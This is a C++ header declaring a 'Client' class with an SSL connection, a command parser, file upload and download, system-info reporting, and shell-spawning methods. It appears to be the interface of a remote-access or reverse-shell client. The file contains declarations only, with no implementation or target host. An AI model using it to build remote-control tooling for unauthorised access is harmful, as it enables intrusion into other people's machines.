#ifndef __CLIENT
#define __CLIENT
#include "headers.hpp"
#include "HttpDownload.hpp"

class Client: public Downloader{
	private:
		std::mutex mtxMutex;
		int sckSocket = -1;
		SSL_CTX *sslCTX = nullptr;
	public:
		SSL *sslSocket = nullptr;
		volatile bool isKeepRunning = true;
		volatile bool isRunningShell = false;
		bool isRetry = false;
		bool Connect(c_char*, c_char*);
		void CloseConnection();
		bool CheckSslReturnCode(int);
		~Client(){
			if(sslCTX){
				SSL_CTX_free(sslCTX);
				sslCTX = nullptr;
			}
			if(sslSocket){
				SSL_shutdown(sslSocket);
				SSL_free(sslSocket);
				sslSocket = nullptr;
			}
			if(sckSocket){
				close(sckSocket);
				sckSocket = -1;
			}
		}
		bool ParseCommand(char*&);
		
		bool SendFile(const std::string);
		void SpawnShell(const std::string);
		void threadReadShell(int&);
		bool SendInfo();
		bool SendFullInfo();
		int SendError(const char*);
		void RetrieveFile(u64, const std::string);
};

#endif
